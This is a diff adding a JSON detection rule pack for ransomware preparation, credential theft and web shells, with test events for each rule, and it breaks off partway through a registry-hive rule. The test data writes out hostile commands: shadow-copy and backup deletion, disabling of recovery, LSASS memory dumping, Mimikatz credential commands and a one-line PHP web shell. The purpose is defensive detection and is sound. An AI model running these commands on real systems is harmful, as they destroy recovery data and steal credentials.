@@ -1,0 +1,2631 @@
+{
+ "version": "2026.11.10.1",
+ "created_at": "2026-11-10T00:00:00Z",
+ "description": "Starter content: ransomware preparation, credential theft, persistence, execution and defence evasion. Rules marked audit record hits without alerting until their false-positive rate is known.",
+ "hashes": [
+  {
+   "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+   "name": "EICAR test file",
+   "severity": "low"
+  }
+ ],
+ "file_rules": [
+  {
+   "id": "RMM-F-0001",
+   "name": "EICAR test file",
+   "severity": "low",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [],
+   "strings": [
+    {
+     "hex": "58 35 4f 21 50 25 40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 43 43 29 37 7d 24 45 49 43 41 52 2d 53 54 41 4e 44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a"
+    }
+   ],
+   "max_size": 4096,
+   "tests": [
+    {
+     "hex": "58 35 4f 21 50 25 40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 43 43 29 37 7d 24 45 49 43 41 52 2d 53 54 41 4e 44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a",
+     "expect": true
+    },
+    {
+     "text": "an ordinary file",
+     "expect": false
+    }
+   ]
+  },
+  {
+   "id": "RMM-F-0002",
+   "name": "Mimikatz binary",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1003"
+   ],
+   "strings": [
+    {
+     "hex": "73 65 6b 75 72 6c 73 61 3a 3a 6c 6f 67 6f 6e 70 61 73 73 77 6f 72 64 73",
+     "nocase": true
+    },
+    {
+     "hex": "67 65 6e 74 69 6c 6b 69 77 69",
+     "nocase": true
+    },
+    {
+     "hex": "6d 69 6d 69 6b 61 74 7a",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "at_least": 2
+   },
+   "tests": [
+    {
+     "hex": "2e 2e 2e 20 67 65 6e 74 69 6c 6b 69 77 69 20 2e 2e 2e 20 73 65 6b 75 72 6c 73 61 3a 3a 4c 6f 67 6f 6e 50 61 73 73 77 6f 72 64 73 20 2e 2e 2e",
+     "expect": true
+    },
+    {
+     "hex": "6d 69 6d 69 6b 61 74 7a 20 69 73 20 6d 65 6e 74 69 6f 6e 65 64 20 6f 6e 63 65 20 69 6e 20 74 68 69 73 20 61 72 74 69 63 6c 65",
+     "expect": false
+    }
+   ]
+  },
+  {
+   "id": "RMM-F-0003",
+   "name": "PHP web shell",
+   "severity": "high",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1505.003"
+   ],
+   "strings": [
+    {
+     "hex": "65 76 61 6c 28 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f",
+     "nocase": true
+    },
+    {
+     "hex": "73 79 73 74 65 6d 28 24 5f 67 65 74 5b",
+     "nocase": true
+    },
+    {
+     "hex": "61 73 73 65 72 74 28 24 5f 70 6f 73 74 5b",
+     "nocase": true
+    },
+    {
+     "hex": "70 61 73 73 74 68 72 75 28 24 5f 72 65 71 75 65 73 74 5b",
+     "nocase": true
+    }
+   ],
+   "max_size": 2097152,
+   "tests": [
+    {
+     "text": "<?php system($_GET['c']); ?>",
+     "expect": true
+    },
+    {
+     "text": "<?php echo htmlspecialchars($_GET['q']); ?>",
+     "expect": false
+    }
+   ]
+  },
+  {
+   "id": "RMM-F-0004",
+   "name": "Cobalt Strike beacon",
+   "severity": "severe",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1071.001"
+   ],
+   "strings": [
+    {
+     "hex": "62 65 61 63 6f 6e 2e 64 6c 6c"
+    },
+    {
+     "hex": "52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72"
+    },
+    {
+     "hex": "25 73 20 61 73 20 25 73 5c 25 73 3a 20 25 64"
+    }
+   ],
+   "condition": {
+    "at_least": 2
+   },
+   "tests": [
+    {
+     "text": "MZ...beacon.dll...ReflectiveLoader...",
+     "expect": true
+    },
+    {
+     "text": "MZ...ReflectiveLoader only",
+     "expect": false
+    }
+   ]
+  }
+ ],
+ "behaviour_rules": [
+  {
+   "id": "RMM-B-0001",
+   "name": "Volume shadow copies deleted",
+   "description": "vssadmin deleting or shrinking shadow copies, the first step of most ransomware.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1490"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "vssadmin"
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "delete\\s+shadows",
+       "resize\\s+shadowstorage.*maxsize=\\s*(401|[0-9]{1,3})mb"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "vssadmin.exe",
+       "command_line": "vssadmin.exe Delete Shadows /All /Quiet"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "vssadmin.exe",
+       "command_line": "vssadmin list shadows"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0002",
+   "name": "Shadow copies deleted through WMI",
+   "description": "wmic or PowerShell deleting Win32_ShadowCopy objects.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1490"
+   ],
+   "event": "process",
+   "when": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "process.name",
+        "op": "equals",
+        "value": "wmic"
+       },
+       {
+        "field": "process.command_line",
+        "op": "regex",
+        "value": [
+         "shadowcopy\\s+delete"
+        ]
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "process.name",
+        "op": "equals",
+        "value": [
+         "powershell",
+         "pwsh"
+        ]
+       },
+       {
+        "field": "process.command_line",
+        "op": "contains",
+        "value": "win32_shadowcopy"
+       },
+       {
+        "field": "process.command_line",
+        "op": "contains",
+        "value": [
+         "delete",
+         "remove-"
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "WMIC.exe",
+       "command_line": "wmic shadowcopy delete /nointeractive"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "wmic.exe",
+       "command_line": "wmic shadowcopy list brief"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0003",
+   "name": "Windows recovery disabled",
+   "description": "bcdedit switching off automatic repair, which ransomware does before encrypting.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1490"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "bcdedit"
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "recoveryenabled\\s+(no|off|0)",
+       "bootstatuspolicy\\s+ignoreallfailures"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bcdedit.exe",
+       "command_line": "bcdedit /set {default} recoveryenabled No"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bcdedit.exe",
+       "command_line": "bcdedit /enum"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0004",
+   "name": "Backup catalog deleted",
+   "description": "wbadmin deleting the backup catalog or system state backups.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1490"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "wbadmin"
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "delete\\s+(catalog|systemstatebackup|backup)"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "wbadmin.exe",
+       "command_line": "wbadmin delete catalog -quiet"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "wbadmin.exe",
+       "command_line": "wbadmin get versions"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0005",
+   "name": "Many files renamed by one process",
+   "description": "30 renames within a minute by the same process, in watched folders: typical of encryption.",
+   "severity": "high",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1486"
+   ],
+   "event": "file",
+   "when": {
+    "field": "file.old_path",
+    "op": "exists"
+   },
+   "tests": [
+    {
+     "events": [
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc0.pdf.locked",
+        "old_path": "/home/a/doc0.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc1.pdf.locked",
+        "old_path": "/home/a/doc1.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc2.pdf.locked",
+        "old_path": "/home/a/doc2.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc3.pdf.locked",
+        "old_path": "/home/a/doc3.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc4.pdf.locked",
+        "old_path": "/home/a/doc4.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc5.pdf.locked",
+        "old_path": "/home/a/doc5.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc6.pdf.locked",
+        "old_path": "/home/a/doc6.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc7.pdf.locked",
+        "old_path": "/home/a/doc7.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc8.pdf.locked",
+        "old_path": "/home/a/doc8.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc9.pdf.locked",
+        "old_path": "/home/a/doc9.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc10.pdf.locked",
+        "old_path": "/home/a/doc10.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc11.pdf.locked",
+        "old_path": "/home/a/doc11.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc12.pdf.locked",
+        "old_path": "/home/a/doc12.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc13.pdf.locked",
+        "old_path": "/home/a/doc13.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc14.pdf.locked",
+        "old_path": "/home/a/doc14.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc15.pdf.locked",
+        "old_path": "/home/a/doc15.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc16.pdf.locked",
+        "old_path": "/home/a/doc16.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc17.pdf.locked",
+        "old_path": "/home/a/doc17.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc18.pdf.locked",
+        "old_path": "/home/a/doc18.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc19.pdf.locked",
+        "old_path": "/home/a/doc19.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc20.pdf.locked",
+        "old_path": "/home/a/doc20.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc21.pdf.locked",
+        "old_path": "/home/a/doc21.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc22.pdf.locked",
+        "old_path": "/home/a/doc22.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc23.pdf.locked",
+        "old_path": "/home/a/doc23.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc24.pdf.locked",
+        "old_path": "/home/a/doc24.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc25.pdf.locked",
+        "old_path": "/home/a/doc25.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc26.pdf.locked",
+        "old_path": "/home/a/doc26.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc27.pdf.locked",
+        "old_path": "/home/a/doc27.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc28.pdf.locked",
+        "old_path": "/home/a/doc28.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc29.pdf.locked",
+        "old_path": "/home/a/doc29.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      }
+     ],
+     "expect": true
+    },
+    {
+     "events": [
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc0.pdf.locked",
+        "old_path": "/home/a/doc0.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc1.pdf.locked",
+        "old_path": "/home/a/doc1.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc2.pdf.locked",
+        "old_path": "/home/a/doc2.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc3.pdf.locked",
+        "old_path": "/home/a/doc3.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc4.pdf.locked",
+        "old_path": "/home/a/doc4.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc5.pdf.locked",
+        "old_path": "/home/a/doc5.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc6.pdf.locked",
+        "old_path": "/home/a/doc6.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc7.pdf.locked",
+        "old_path": "/home/a/doc7.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc8.pdf.locked",
+        "old_path": "/home/a/doc8.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      },
+      {
+       "ts": "2026-11-10T12:00:00Z",
+       "kind": "file",
+       "action": "rename",
+       "file": {
+        "path": "/home/a/doc9.pdf.locked",
+        "old_path": "/home/a/doc9.pdf"
+       },
+       "process": {
+        "pid": 77,
+        "ppid": 1000,
+        "name": "enc.exe",
+        "command_line": "enc.exe"
+       }
+      }
+     ],
+     "expect": false
+    }
+   ],
+   "actions": [
+    "rename"
+   ],
+   "threshold": {
+    "count": 30,
+    "seconds": 60,
+    "group_by": "process.pid"
+   }
+  },
+  {
+   "id": "RMM-B-0006",
+   "name": "LSASS dumped with comsvcs.dll",
+   "description": "rundll32 calling comsvcs MiniDump, a common way to steal credentials from memory.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1003.001"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "comsvcs"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "minidump"
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "rundll32.exe",
+       "command_line": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "rundll32.exe",
+       "command_line": "rundll32.exe shell32.dll,Control_RunDLL"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0007",
+   "name": "LSASS dumped with ProcDump",
+   "description": "Sysinternals ProcDump pointed at lsass.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1003.001"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": [
+       "procdump",
+       "procdump64"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "lsass"
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "procdump64.exe",
+       "command_line": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "procdump.exe",
+       "command_line": "procdump -ma w3wp.exe"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0008",
+   "name": "Mimikatz commands",
+   "description": "Mimikatz module syntax on a command line.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1003",
+    "T1558"
+   ],
+   "event": "process",
+   "when": {
+    "field": "process.command_line",
+    "op": "contains",
+    "value": [
+     "sekurlsa::",
+     "lsadump::",
+     "kerberos::golden",
+     "privilege::debug",
+     "invoke-mimikatz"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "m.exe",
+       "command_line": "m.exe privilege::debug sekurlsa::logonpasswords exit"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "notepad.exe",
+       "command_line": "notepad.exe notes.txt"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0009",
+   "name": "Credential hives saved",
+   "description": "reg.exe saving the SAM, SECURITY or SYSTEM hive, to crack offline.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1003.002"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "reg"
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "\\b(save|export)\\s+(hklm|hkey_local_machine)\\\\(sam|security|system)\\b"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
